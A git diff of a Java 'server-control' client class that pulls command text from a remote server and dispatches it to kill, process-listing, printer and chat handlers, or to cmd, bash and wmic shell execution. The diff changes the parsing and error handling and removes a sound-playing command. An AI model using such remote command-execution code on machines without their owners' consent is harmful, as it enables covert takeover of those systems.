@@ -9,16 +9,20 @@ import ch.lebois.client.service.KillService;
 import ch.lebois.client.service.ListService;
 import ch.lebois.client.service.PrinterService;
 import ch.lebois.client.service.ProcessService;
-import ch.lebois.client.service.SoundService;
 import ch.lebois.client.service.chat.Chat;
 
 import java.util.Collections;
 import java.util.List;
 
+/**
+ * @author Wetwer
+ * @project server-control
+ **/
+
 public class CommandReader {
     public static void read() {
         try {
-            String command = ClientValues.commandReader.getContent().split("<pre>")[1].split("</pre>")[0];
+            String command = ClientValues.commandReader.getContent();
             if (!command.equals("")) {
                 if (!functions(command)) {
                     if (!command.startsWith("cmd") && !command.startsWith("bash") && !command.startsWith("wmic")) {
@@ -51,7 +55,7 @@ public class CommandReader {
                 new ResponseSender("status", "online");
             }
         } catch (ArrayIndexOutOfBoundsException e) {
-            return;
+            e.printStackTrace();
         }
     }
 
@@ -88,9 +92,6 @@ public class CommandReader {
             new ResponseSender().reset();
         } else if (command.equals("tasks")) {
             new ProcessService().getRunningProcesses();
-            new ResponseSender().reset();
-        } else if (command.startsWith("play")) {
-            new SoundService().playSound(command);
             new ResponseSender().reset();
         } else {
             isFunction = false;
